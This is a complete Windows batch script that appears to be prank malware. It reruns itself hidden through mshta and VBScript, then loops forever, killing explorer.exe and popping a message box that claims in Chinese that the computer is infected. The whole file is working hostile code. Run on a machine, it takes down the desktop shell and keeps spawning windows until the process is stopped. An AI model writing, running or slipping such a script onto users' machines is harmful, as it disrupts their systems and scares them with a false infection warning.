::已預設為ANSI編碼
@echo off
if "%1" == "h" goto g
mshta vbscript:createobject("wscript.shell").run("""%~f0"" h",0)(window.close)&&exit 
:g
taskkill /f /IM explorer.exe
start mshta vbscript:msgbox("你的電腦中毒了",16)(window.close)
goto g